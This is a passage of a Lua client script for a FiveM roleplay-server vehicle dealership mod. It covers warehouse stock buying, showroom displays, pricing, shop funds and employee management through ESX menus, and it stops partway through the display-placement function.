-- https://modit.store
-- ModFreakz

VehicleShops = {}
VehicleShops.SpawnedVehicles = {}

VehicleShops.Init = function()
  local start = GetGameTimer()
  while not ESX.IsPlayerLoaded() do Wait(0); end
  while (GetGameTimer() - start) < 2000 do Wait(0); end
  ESX.TriggerServerCallback("VehicleShops:GetVehicleShops",function(shopData,kashId)
    VehicleShops.KashId = (kashId or false)
    VehicleShops.Shops  = (shopData.shops or {})
    VehicleShops.WarehouseVehicles = (shopData.vehicles or {})
    VehicleShops.RefreshBlips()
    VehicleShops.Update()
  end)
end

VehicleShops.WarehouseRefresh = function(data)
  VehicleShops.WarehouseVehicles = data
  if InsideWarehouse then
    ESX.ShowNotification("Warehouse stock refreshed. You must re-enter the building.")
    VehicleShops.LeaveWarehouse()
  end
end

VehicleShops.Update = function()
  while true do
    local wait_time = 0
    local plyPos = GetEntityCoords(PlayerPedId())
    if InsideWarehouse then
      local closest,closestDist
      for k,v in pairs(ShopVehicles) do
        local dist = Vdist(plyPos.x,plyPos.y,plyPos.z,v.pos.x,v.pos.y,v.pos.z)
        if not closestDist or dist < closestDist then
          closest = v
          closestDist = dist
        end
      end

      if closest and closestDist and closestDist < 5.0 then
        local min,max = GetModelDimensions(GetHashKey(closest.model))
        local up = vector3(0.0,0.0,0.0)
        local posA = closest.pos.xyz + up
        DrawText3D(posA.x,posA.y,posA.z + max.z, closest.name.." [$~g~"..closest.price.."~s~]\n[~g~G~s~] Purchase",15.0)
        if IsControlJustPressed(0,47) then
          VehicleShops.PurchaseStock(closest)
        end
      end
    else
      local closest,closestDist = VehicleShops.GetClosestShop()
      if closestDist < 100.0 then
        local closestVeh,vehDist
        for k,v in pairs(VehicleShops.Shops[closest].displays) do
          local dist = Vdist(plyPos.x,plyPos.y,plyPos.z,v.location.x,v.location.y,v.location.z)
          if not vehDist or dist < vehDist then
            closestVeh = k
            vehDist = dist
          end

          if not VehicleShops.SpawnedVehicles[v.vehicle.plate] then
            RequestModel(v.vehicle.model)
            while not HasModelLoaded(v.vehicle.model) do Wait(0); end

            local veh = CreateVehicle(v.vehicle.model, v.location.x,v.location.y,v.location.z,v.location.heading, false,false)

            FreezeEntityPosition(veh,true)
            SetEntityAsMissionEntity(veh,true,true)
            SetVehicleUndriveable(veh,true)
            SetVehicleDoorsLocked(veh,2)

            SetEntityProofs(veh,true,true,true,true,true,true,true,true)
            SetVehicleTyresCanBurst(veh,false)

            SetModelAsNoLongerNeeded(v.vehicle.model)

            ESX.Game.SetVehicleProperties(veh,v.vehicle)

            v.entity = veh

            VehicleShops.SpawnedVehicles[v.vehicle.plate] = veh
          else
            if not last_spawn_message then
              last_spawn_message = GetGameTimer()
            else
              if GetGameTimer() - last_spawn_message > 1000 then
                last_spawn_message = GetGameTimer()
              end
            end
          end
        end

        if not VehicleShops.Moving and vehDist and vehDist < 10.0 then
          local pos = VehicleShops.Shops[closest].displays[closestVeh].location
          local label = GetLabelText(GetDisplayNameFromVehicleModel(VehicleShops.Shops[closest].displays[closestVeh].vehicle.model))
          local price = (VehicleShops.Shops[closest].displays[closestVeh].price or false)
          local min,max = GetModelDimensions( VehicleShops.Shops[closest].displays[closestVeh].vehicle.model )
          DrawText3D(pos.x,pos.y,pos.z + max.z, label .. (price and " [$~g~"..price.."~s~]\n[~g~G~s~] Purchase" or ''),15.0)
          if price then
            if IsControlJustReleased(0,47) then
              local doCont = true
              while doCont do
                local dist = Vdist(GetEntityCoords(PlayerPedId()),vector3(pos.x,pos.y,pos.z))
                if dist > 10.0 then
                  doCont = false
                end 
                DrawText3D(pos.x,pos.y,pos.z + max.z, label .. (price and " [$~g~"..price.."~s~]\n[~g~G~s~] Confirm" or ''),15.0)
                if IsControlJustPressed(0,47) then
                  Wait(100)
                  local ent = VehicleShops.SpawnedVehicles[VehicleShops.Shops[closest].displays[closestVeh].vehicle.plate]
                  VehicleShops.PurchaseDisplay(closest,closestVeh,ent)
                  doCont = false
                end
                Wait(0)
              end
            end
          end
        end
      else
        wait_time = 1000
      end
    end
    Wait(wait_time)
  end
end

VehicleShops.GetClosestShop = function()
  local pos = GetEntityCoords(PlayerPedId())
  local closest,closestDist
  for k,v in pairs(VehicleShops.Shops) do
    local dist = Vdist(pos.x,pos.y,pos.z,v.locations.entry.x,v.locations.entry.y,v.locations.entry.z)
    if not closestDist or dist < closestDist then
      closestDist = dist
      closest = k
    end
  end
  return (closest or false),(closestDist or 9999)
end

VehicleShops.PurchasedShop = function(shop)
  local closest,dist = VehicleShops.GetClosestShop()
  ESX.TriggerServerCallback("VehicleShops:PurchaseShop",function(can_buy)
    if can_buy then
      ESX.ShowNotification(string.format("You purchased the shop for $%i.",VehicleShops.Shops[closest].price))
    else
      ESX.ShowNotification("Can't afford that.")
    end
  end,closest)
end

VehicleShops.PurchaseStockVehicle = function(vehicle_data,shop_key)
  if VehicleShops.Shops[shop_key].funds >= vehicle_data.price then
    local label = GetLabelText(GetDisplayNameFromVehicleModel(vehicle_data.model))
    ESX.ShowNotification("You purchased "..label.." for $"..vehicle_data.price,"success")

    local plyPed = PlayerPedId()
    local plyPos = GetEntityCoords(plyPed)
    DoScreenFadeOut(500)
    Wait(500)
    local props = ESX.Game.GetVehicleProperties(vehicle_data.ent)
    ESX.TriggerServerCallback("VehicleShops:GenerateNewPlate",function(newPlate)
      props.plate = newPlate

      RequestModel(props.model)
      while not HasModelLoaded(props.model) do Wait(0); end

      local newVeh = CreateVehicle(props.model,plyPos.x,plyPos.y,plyPos.z + 50.,0.0,true,true)

      props.mileage = 0
      props.serviced_at = 0
      props.class = GetVehicleClass(newVeh)

      TriggerServerEvent("VehicleShops:VehiclePurchased",shop_key,vehicle_data.key,props)

      ESX.Game.SetVehicleProperties(newVeh,props)

      SetVehicleEngineOn(newVeh,true,true,true)
	  local plate = GetVehicleNumberPlateText(newVeh)
      TriggerServerEvent('garage:addKeys', plate)
      TaskWarpPedIntoVehicle(plyPed,newVeh,-1)

      local targetPos = Warehouse.purchasedSpawns[math.random(#Warehouse.purchasedSpawns)]
      SetEntityCoordsNoOffset(newVeh,targetPos.x,targetPos.y,targetPos.z)
      SetEntityHeading(newVeh,targetPos.w)
      SetVehicleOnGroundProperly(newVeh)
      SetEntityAsMissionEntity(newVeh,true,true)
      DoScreenFadeIn(500)

      InsideWarehouse = false
      VehicleShops.DespawnShop()
    end)
  else
    ESX.ShowNotification("Not enough funds.","error")
  end
end

VehicleShops.PurchaseStock = function(vehicle)
  local elements = {}
  local PlayerData = ESX.GetPlayerData()
  for key,val in pairs(VehicleShops.Shops) do
    if ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) == val.owner then
      table.insert(elements,{
        label = "[$"..val.funds.."] "..val.name,
        value = key
      })
    else
      for k,v in pairs(val.employees) do
        if v.identifier == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then
          table.insert(elements,{
            label = "[$"..val.funds.."] "..val.name,
            value = key
          })
        end
      end
    end
  end
  if #elements <= 0 then
    table.insert(elements,{
      label = "No shops to display."
    })
  end

   ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'player_dressing', {
    title    = "Management",
    align    = 'top-left',
    elements = elements
  },
    function(data,menu)
      menu.close()
      local element = data.current
      if element.value then
        VehicleShops.PurchaseStockVehicle(vehicle,element.value)
      end
    end,
    function(d,m)
      m.close()
    end
  )
end

VehicleShops.EnterWarehouse = function(...)
  local plyPed = PlayerPedId()
  ESX.ShowNotification("Spawning shop, please wait for models to load.")
  Wait(1000)

  DoScreenFadeOut(500)
  Wait(500)

  SetEntityCoordsNoOffset(plyPed, Warehouse.exit.x,Warehouse.exit.y,Warehouse.exit.z)
  SetEntityHeading(plyPed, Warehouse.exit.w)
  FreezeEntityPosition(plyPed, true)

  VehicleShops.SpawnShop()
  FreezeEntityPosition(plyPed, false)
  DoScreenFadeIn(500)


  InsideWarehouse = true

  local marker = {
    display  = false,
    location = Warehouse.exit,
    maintext = "Warehouse",
    scale    = vector3(1.5,1.5,1.5),
    distance = 1.0,
    control  = 38,
    callback = VehicleShops.LeaveWarehouse,
    args     = {"buy",k}
  }
  TriggerEvent("Markers:Add",marker,function(m)
    WarehouseMarker = m
  end)
end

VehicleShops.ManageDisplays = function(shop_key)
  local shop = VehicleShops.Shops[shop_key]

  local elements = {}
  for _,vehicle_data in pairs(shop.stock) do
    if vehicle_data and vehicle_data.vehicle and vehicle_data.vehicle.plate then
      table.insert(elements,{
        label = "["..(vehicle_data.vehicle.plate or '').."] "..GetLabelText(GetDisplayNameFromVehicleModel(vehicle_data.vehicle.model)),
        value = vehicle_data,
        key   = _
      })
    end
  end
  if #elements == 0 then
    table.insert(elements,{
      label = "No vehicles to display."
    })
  end

  local clicked = false
  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_displays', {
    title    = "Displays",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        clicked = true
        VehicleShops.DoDisplayVehicle(shop_key,element.key,element.value)
      else
        VehicleShops.ManageVehicles(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageVehicles(shop_key)
    end
  )
end

VehicleShops.ManageDisplayed = function(shop_key)
  local shop = VehicleShops.Shops[shop_key]

  local elements = {}
  if TableCount(shop.displays) > 0 then
    for _,vehicle_data in pairs(shop.displays) do
      if vehicle_data and vehicle_data.vehicle and vehicle_data.vehicle.plate then
        table.insert(elements,{
          label = "["..vehicle_data.vehicle.plate.."] "..GetLabelText(GetDisplayNameFromVehicleModel(vehicle_data.vehicle.model)),
          value = vehicle_data,
          key   = _
        })
      end
    end
  else
    table.insert(elements,{
      label = "No vehicles to display."
    })
  end

  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'displayed_vehicle', {
    title    = "Display",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        VehicleShops.ManageVehicles(shop_key)
        TriggerServerEvent("VehicleShops:RemoveDisplay",shop.name,element.key)
      else
        VehicleShops.ManageVehicles(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageVehicles(shop_key)
    end
  )
end

VehicleShops.DoSetPrice = function(shop,vehicle)
  TriggerEvent("Input:Open","Set Price","ESX",function(p)
    local price = (p and tonumber(p) and tonumber(p) > 0 and tonumber(p) or false)
    if not price then
      ESX.ShowNotification("Set a valid price.")
      Wait(200)
      VehicleShops.DoSetPrice(shop,vehicle)
    else      
      local vehData = VehicleShops.Shops[shop].displays[vehicle]
      ESX.ShowNotification("You set the price for the "..(GetLabelText(GetDisplayNameFromVehicleModel(vehData.vehicle.model))).." at $"..price)
      TriggerServerEvent("VehicleShops:SetPrice",vehicle,shop,price)
      VehicleShops.ManagementMenu(shop)
    end
  end)
end

VehicleShops.ManageShop = function(shop_key)
  local elements = {
    {label = "Add Funds",value="Add"},
    {label = "Take Funds",value="Take"},
    {label = "Check Funds",value="Check"},
  }

  local input_open = false
  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_shop', {
    title    = "Shop",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      local element = d.current
      if element.value == "Add" then
        input_open = true
        m.close()
        TriggerEvent("Input:Open","Add Funds","ESX",function(res)
          res = (res and tonumber(res) and tonumber(res) > 0 and tonumber(res) or false)
          input_open = false
          if res then
            TriggerServerEvent("VehicleShops:AddFunds",shop_key,res)
          end
          VehicleShops.ManagementMenu(shop_key)
        end)
      elseif element.value == "Take" then
        input_open = true
        m.close()
        TriggerEvent("Input:Open","Take Funds","ESX",function(res)
          res = (res and tonumber(res) and tonumber(res) > 0 and tonumber(res) or false)
          input_open = false
          if res then
            TriggerServerEvent("VehicleShops:TakeFunds",shop_key,res)
          end
          VehicleShops.ManagementMenu(shop_key)
        end)
      elseif element.value == "Check" then
        ESX.ShowNotification("Funds: $"..VehicleShops.Shops[shop_key].funds,1)
        VehicleShops.ManageShop(shop_key)
      end
    end,
    function(d,m)
      m.close()
      if not input_open then        
        VehicleShops.ManagementMenu(shop_key)
      end
    end
  )
end

VehicleShops.ManagePrices = function(shop_key)
  local shop = VehicleShops.Shops[shop_key]

  local elements = {}
  if TableCount(shop.displays) > 0 then
    for _,vehicle_data in pairs(shop.displays) do
      if vehicle_data and vehicle_data.vehicle and vehicle_data.vehicle.plate then
        table.insert(elements,{
          label = "["..vehicle_data.vehicle.plate.."] "..GetLabelText(GetDisplayNameFromVehicleModel(vehicle_data.vehicle.model)),
          value = vehicle_data,
          key   = _
        })
      end
    end
  else
    table.insert(elements,{
      label = "No vehicles to display."
    })
  end

  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mnanage_prices', {
    title    = "Prices",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        VehicleShops.DoSetPrice(shop_key,element.key)
      else
        VehicleShops.ManageVehicles(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageVehicles(shop_key)
    end
  )
end

VehicleShops.DriveVehicle = function(shop_key)
  local shop = VehicleShops.Shops[shop_key]

  local elements = {}
  if #shop.stock > 0 then
    for _,vehicle_data in pairs(shop.stock) do      
      if vehicle_data and vehicle_data.vehicle and vehicle_data.vehicle.plate then
        table.insert(elements,{
          label = "["..vehicle_data.vehicle.plate.."] "..GetLabelText(GetDisplayNameFromVehicleModel(vehicle_data.vehicle.model)),
          value = vehicle_data,
          key   = _
        })
      end
    end
  else
    table.insert(elements,{
      label = "No vehicles to display."
    })
  end

  local clicked = false
  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'drive_vehicle', {
    title    = "Drive",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        ESX.TriggerServerCallback("VehicleShops:DriveVehicle",function(can_drive)
          if can_drive then
            local vehicle = element.value
            local props = vehicle.vehicle
            local pos = VehicleShops.Shops[shop_key].locations.purchased

            RequestModel(props.model)
            while not HasModelLoaded(props.model) do Wait(0); end

            local veh = CreateVehicle(props.model,pos.x,pos.y,pos.z,pos.heading,true,true)
            SetEntityAsMissionEntity(veh,true,true)
            ESX.Game.SetVehicleProperties(veh,props)
			local plate = GetVehicleNumberPlateText(veh)
      		TriggerServerEvent('garage:addKeys', plate)
            TaskWarpPedIntoVehicle(PlayerPedId(),veh,-1)
            SetVehicleEngineOn(veh,true)
          else
            ESX.ShowNotification(msg)
          end
        end,shop_key,element.key)
      else
        VehicleShops.ManageVehicles(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageVehicles(shop_key)
    end
  )
end

VehicleShops.ManageVehicles = function(shop_key)
  local clicked = false
  local elements = {
    {label = "Display Vehicles",value = "Display"},
    {label = "Store Vehicles",value = "Store"},
    {label = "Set Vehicle Price",value = "Price"},
    {label = "Drive Stock Vehicle",value = "Drive"},
  }
  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_vehicles', {
    title    = "Vehicles",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      clicked = true
      local element = d.current
      if element.value == "Display" then
        VehicleShops.ManageDisplays(shop_key)
      elseif element.value == "Store" then
        VehicleShops.ManageDisplayed(shop_key)
      elseif element.value == "Price" then
        VehicleShops.ManagePrices(shop_key)
      elseif element.value == "Drive" then
        VehicleShops.DriveVehicle(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManagementMenu(shop_key)
    end
  )
end

VehicleShops.HireMenu = function(shop_key)
  local elements = {}
  local ply = PlayerId()
  for k,v in pairs(ESX.Game.GetPlayersInArea(GetEntityCoords(PlayerPedId()),10.0)) do
    if v ~= ply then
      table.insert(elements,{
        label = GetPlayerName(v),
        value = GetPlayerServerId(v)
      })
    end
  end

  if #elements <= 0 then
    table.insert(elements,{
      label = "No players nearby."
    })
  end

  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'hire_player', {
    title    = "Hire",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        TriggerServerEvent("VehicleShops:HirePlayer",shop_key,element.value)
        VehicleShops.ManageEmployees(shop_key)
      else
        VehicleShops.ManageEmployees(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageEmployees(shop_key)
    end
  )
end

VehicleShops.FireMenu = function(shop_key)
  local elements = {}
  for k,v in pairs(VehicleShops.Shops[shop_key].employees) do
    if v ~= PlayerId() then
      table.insert(elements,{
        label = v.identity.firstname .. " " .. v.identity.lastname,
        value = v.identifier  
      })
    end
  end

  if #elements <= 0 then
    table.insert(elements,{
      label = "No employees to display."
    })
  end

  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fire_player', {
    title    = "Fire",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        TriggerServerEvent("VehicleShops:FirePlayer",shop_key,element.value)
        VehicleShops.ManageEmployees(shop_key)
      else
        VehicleShops.ManageEmployees(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageEmployees(shop_key)
    end
  )
end

VehicleShops.PayMenu = function(shop_key)
  local elements = {}
  for k,v in pairs(VehicleShops.Shops[shop_key].employees) do
    if v ~= PlayerId() then
      table.insert(elements,{
        label = v.identity.firstname .. " " .. v.identity.lastname,
        value = v.identifier  
      })
    end
  end

  if #elements <= 0 then
    table.insert(elements,{
      label = "No employees to display."
    })
  end

  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'pay_player', {
    title    = "Pay",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value then
        TriggerEvent("Input:Open","Pay Amount","ESX",function(amount)
          amount = (tonumber(amount) ~= nil and tonumber(amount) >= 1 and tonumber(amount) or false)
          if not amount then
            ESX.ShowNotification("Invalid amount entered.")
          else
            if VehicleShops.Shops[shop_key].funds < amount then
              ESX.ShowNotification("Shop doesn't have this much funds.")
            else
              TriggerServerEvent("VehicleShops:PayPlayer",shop_key,element.value,amount)
            end
          end
          VehicleShops.ManageEmployees(shop_key)
        end)
      else
        VehicleShops.ManageEmployees(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManageEmployees(shop_key)
    end
  )
end

VehicleShops.ManageEmployees = function(shop_key)
  local elements = {
    {label = "Hire Employee",value = "Hire"},
    {label = "Fire Employee",value = "Fire"},
    {label = "Pay Employee",value = "Pay"},
  }
  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_employees', {
    title    = "Employees",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value == "Fire" then
        VehicleShops.FireMenu(shop_key)
      elseif element.value == "Hire" then
        VehicleShops.HireMenu(shop_key)
      elseif element.value == "Pay" then
        VehicleShops.PayMenu(shop_key)
      end
    end,
    function(d,m)
      m.close()
      VehicleShops.ManagementMenu(shop_key)
    end
  )
end

VehicleShops.ManagementMenu = function(shop_key)
  local elements = {}

  local PlayerData = ESX.GetPlayerData()
  if VehicleShops.Shops[shop_key].owner == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then
    elements = {
      {label = "Vehicle Management",  value="Vehicle"},
      {label = "Shop Management",     value="Shop"},
      {label = "Employee Management", value="Employee"},
    }
  else
    elements = {
      {label = "Vehicle Management",  value="Vehicle"},
    }
  end

  ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'management_menu', {
    title    = "Management",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      m.close()
      local element = d.current
      if element.value == "Vehicle" then
        VehicleShops.ManageVehicles(shop_key)
      elseif element.value == "Shop" then
        VehicleShops.ManageShop(shop_key)
      elseif element.value == "Employee" then
        VehicleShops.ManageEmployees(shop_key)
      end
    end,
    function(d,m)
      m.close()
    end
  )
end

VehicleShops.DepositVehicle = function(shop_key)
  local ply_ped = PlayerPedId()
  if IsPedInAnyVehicle(ply_ped,false) then
    local ply_veh = GetVehiclePedIsUsing(ply_ped,false)
    local driver = GetPedInVehicleSeat(ply_veh,-1)
    if driver == ply_ped then
      VehicleShops.CanStockVehicle(shop_key,ply_veh,function(can_store,do_delete)
        if can_store then
          local props = ESX.Game.GetVehicleProperties(ply_veh)
          TriggerServerEvent("VehicleShops:StockedVehicle",props,shop_key,do_delete)
          TaskLeaveVehicle(ply_ped,ply_veh,0)
          TaskEveryoneLeaveVehicle(ply_veh)
          SetEntityAsMissionEntity(ply_veh,true,true)
          DeleteVehicle(ply_veh)
        end
      end)
    end
  end
end

VehicleShops.CanStockVehicle = function(shop_key,vehicle,callback)
  local plyPed = PlayerPedId()
  local isEmployed = false
  local PlayerData = ESX.GetPlayerData()
  if VehicleShops.Shops[shop_key].owner == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then 
    isEmployed = true
  else
    for k,v in pairs(VehicleShops.Shops[shop_key].employees) do
      if v.identifier == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then
        isEmployed = true
        break
      end
    end
  end
  if not isEmployed then return false; end
  local props = ESX.Game.GetVehicleProperties(vehicle)
  ESX.TriggerServerCallback("VehicleShops:GetVehicleOwner",function(owner)
    if owner and (VehicleShops.Shops[shop_key].owner:match(owner) or ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier):match(owner)) then
      callback(true,true)
    else
      if not owner then
        if Config.StockStolenPedVehicles then
          callback(true,false)
        else
          ESX.ShowNotification("You can't stock stolen vehicles.")
          callback(false)
        end
        return
      else
        if Config.StockStolenPlayerVehicles then
          callback(true,true)
        else
          ESX.ShowNotification("You can't stock other players vehicles.")
          callback(false)
        end
        return
      end
      callback(false)
    end
  end,props.plate)
end

VehicleShops.Interact = function(a,b)
  if (a == "buy") then
    VehicleShops.PurchasedShop()
  elseif (a == "deposit") then
    VehicleShops.DepositVehicle(b)
  elseif (a == "management") then
    VehicleShops.ManagementMenu(b)
  end
end

VehicleShops.LeaveWarehouse = function()
  local plyPed = PlayerPedId()
  SetEntityCoordsNoOffset(plyPed, Warehouse.entry.x,Warehouse.entry.y,Warehouse.entry.z)
  SetEntityHeading(plyPed, Warehouse.entry.w)
  VehicleShops.DespawnShop()
  InsideWarehouse = false

  TriggerEvent("Markers:Remove",WarehouseMarker)
end

VehicleShops.RefreshBlips = function()  
  local dictStreamed = false
  local startTime = GetGameTimer()

  local PlayerData = ESX.GetPlayerData()
  local is_dealer = false
  for k,v in pairs(VehicleShops.Shops) do
    if v.owner == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then
      is_dealer = true
    end
    if not is_dealer then
      for k,v in pairs(v.employees) do
        if v.identifier == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then
          is_dealer = true
        end
      end
    end
  end

  if DealerMarker and not is_dealer then
    RemoveBlip(DealerBlip)
    TriggerEvent("Markers:Remove",DealerMarker)
  elseif not DealerMarker and is_dealer then
    local pos = (Warehouse.entry)
    local blip = AddBlipForCoord(pos.x,pos.y,pos.z)
    SetBlipSprite(blip, 225)
    SetBlipColour(blip, 3)  
    SetBlipAsShortRange(blip,true)
    BeginTextCommandSetBlipName ("STRING")
    AddTextComponentString      ("Vehicle Warehouse")
    EndTextCommandSetBlipName   (blip)

    DealerBlip = blip

    local marker = {
      display  = false,
      location = pos,
      maintext = "Warehouse",
      scale    = vector3(1.5,1.5,1.5),
      distance = 1.0,
      control  = 38,
      callback = VehicleShops.EnterWarehouse,
      args     = {"buy",k}
    }
    TriggerEvent("Markers:Add",marker,function(m)
      DealerMarker = m
    end)
  end

  for k,v in pairs(VehicleShops.Shops) do
    if not v.blip then
      SetAllVehicleGeneratorsActiveInArea(v.locations.entry.x - 50.0, v.locations.entry.y - 50.0, v.locations.entry.z - 50.0, v.locations.entry.x + 50.0, v.locations.entry.y + 50.0, v.locations.entry.z  + 50.0, false, false);
      local pos = (v.locations.entry)
      local blip = AddBlipForCoord(pos.x,pos.y,pos.z)
      SetBlipSprite(blip, 225)
      SetBlipColour(blip, (v.owner == "none" and 0 or 5))  
      BeginTextCommandSetBlipName ("STRING")
      AddTextComponentString      ("Vehicle Shop")
      SetBlipAsShortRange(blip,true)
      EndTextCommandSetBlipName   (blip)
      
      VehicleShops.Shops[k].blip = blip

      VehicleShops.Shops[k].markers = {}

      if not v.owner then
        local marker = {
          display  = false,
          location = pos,
          maintext = "Purchase",
          subtext  = "~s~$~g~"..v.price,
          scale    = vector3(1.5,1.5,1.5),
          distance = 1.0,
          control  = 38,
          callback = VehicleShops.Interact,
          args     = {"buy",k}
        }
        TriggerEvent("Markers:Add",marker,function(m)
          VehicleShops.Shops[k].markers["buy"] = m
        end)
      else
        local render_menus = false
        for k,v in pairs(VehicleShops.Shops[k].employees) do
          if v.identifier == ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) then
            render_menus = true
          end
        end
        if not render_menus and ((VehicleShops.KashId and VehicleShops.KashId..":" or "")..PlayerData.identifier) == v.owner then
          render_menus = true
        end
        if render_menus then
          local marker = {
            display  = false,
            location = (v.locations.management),
            maintext = "Management",
            scale    = vector3(1.5,1.5,1.5),
            distance = 1.0,
            control  = 38,
            callback = VehicleShops.Interact,
            args     = {"management",k}
          }
          TriggerEvent("Markers:Add",marker,function(m)
            VehicleShops.Shops[k].markers["management"] = m
          end)
          local marker = {
            display  = false,
            location = (v.locations.deposit),
            maintext = "Deposit",
            scale    = vector3(1.5,1.5,1.5),
            distance = 1.0,
            control  = 38,
            callback = VehicleShops.Interact,
            args     = {"deposit",k}
          }
          TriggerEvent("Markers:Add",marker,function(m)
            VehicleShops.Shops[k].markers["deposit"] = m
          end)
        end
      end
    end
  end
end

VehicleShops.Sync = function(data)
  if VehicleShops.Shops then
    for k,v in pairs(VehicleShops.Shops) do
      RemoveBlip(v.blip)
      if v.markers then
        for k,v in pairs(v.markers) do
          TriggerEvent("Markers:Remove",v)
        end
        v.markers = false
      end
      v.blip = false
    end

    VehicleShops.Shops = data
    VehicleShops.RefreshBlips()
  end
end

VehicleShops.SpawnShop = function()
  ShopVehicles = {}
  ShopLookup = {}
  local startTime = GetGameTimer()
  while not IsInteriorReady(GetInteriorAtCoords(GetEntityCoords(PlayerPedId()))) and GetGameTimer() - startTime < 5000 do Wait(0); end
  for k,v in pairs(VehicleShops.WarehouseVehicles) do
    local hash = GetHashKey(v.model)
	if IsModelValid(hash) then
		local started = GetGameTimer()
		RequestModel(hash)
		while not HasModelLoaded(hash) and (GetGameTimer() - started) < 10000 do Wait(0); end
		if HasModelLoaded(hash) then
		local veh = CreateVehicle(hash, v.pos.x,v.pos.y,v.pos.z, v.pos.w, false,false)

		ShopVehicles[k] = {ent = veh,pos = v.pos,price = v.price,name = v.name,model = v.model,key = k}
		ShopLookup[veh] = k

		FreezeEntityPosition(veh,true)
		SetEntityAsMissionEntity(veh,true,true)
		SetVehicleUndriveable(veh,true)
		SetVehicleDoorsLocked(veh,2)
		end
		SetModelAsNoLongerNeeded(hash)
	end
  end  
end

VehicleShops.DespawnShop = function()
  if ShopVehicles then
    for k,v in pairs(ShopVehicles) do
      SetEntityAsMissionEntity(v.ent,true,true)
      DeleteEntity(v.ent)
    end
    ShopVehicles = {}
  end
end

VehicleShops.RemoveDisplay = function(shop,veh,data)
  if VehicleShops.SpawnedVehicles[veh] then
    DeleteVehicle(VehicleShops.SpawnedVehicles[veh])  
    VehicleShops.SpawnedVehicles[veh] = false
  end
  VehicleShops.Sync(data)
end  

VehicleShops.PurchaseDisplay = function(shop_key,veh_key,veh_ent)
  local price = VehicleShops.Shops[shop_key].displays[veh_key].price
  if not price then return; end
  local props = ESX.Game.GetVehicleProperties(veh_ent)
  ESX.TriggerServerCallback("VehicleShops:TryBuy",function(canBuy,msg)
    if canBuy then
      RequestModel(props.model)
      while not HasModelLoaded(props.model) do Wait(0); end
      local pos = VehicleShops.Shops[shop_key].locations.purchased
      local veh = CreateVehicle(props.model,pos.x,pos.y,pos.z,pos.heading,true,true)
      SetEntityAsMissionEntity(veh,true,true)
      ESX.Game.SetVehicleProperties(veh,props)
	  local plate = GetVehicleNumberPlateText(veh)
      TriggerServerEvent('garage:addKeys', plate)
      TaskWarpPedIntoVehicle(PlayerPedId(),veh,-1)
      SetVehicleEngineOn(veh,true)
    else
      ESX.ShowNotification(msg)
    end
  end,shop_key,veh_key,props.plate,GetVehicleClass(veh_ent))
end

VehicleShops.DoDisplayVehicle = function(shopKey,vehKey,vehData)
  local shop = VehicleShops.Shops[shopKey]
  local props = vehData.vehicle
  local pos = shop.locations.spawn

  Wait(500)

  RequestModel(props.model)
  while not HasModelLoaded(props.model) do Wait(0); end

  local displayVehicle = CreateVehicle(props.model, pos.x,pos.y,pos.z, pos.heading, false,false)
  SetEntityCollision(displayVehicle,true,true)
  while not DoesEntityExist(displayVehicle) do Wait(0); end 

  ESX.Game.SetVehicleProperties(displayVehicle,props)
  Wait(500)

  local scaleform = GetMoveScaleform()
  local controls = Controls["Moving_Vehicle"]

  targetPos = vector4(pos.x,pos.y,pos.z,pos.heading)

  SetEntityCoordsNoOffset(displayVehicle,pos.x,pos.y,pos.z)
  SetEntityCollision(displayVehicle,true,true)
  SetVehicleUndriveable(displayVehicle,true)
  FreezeEntityPosition(displayVehicle,true)

  VehicleShops.Moving = true

  while true do
    local didMove,didRot = false,false

    DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 255, 0)

    if IsControlJustPressed(0,controls.cancel) then
      VehicleShops.Moving = false
      SetEntityAsMissionEntity(displayVehicle,true,true)
      DeleteVehicle(displayVehicle)

      VehicleShops.ManagementMenu(shop.name)
      return
    end

    if IsControlPressed(0,controls.place) then
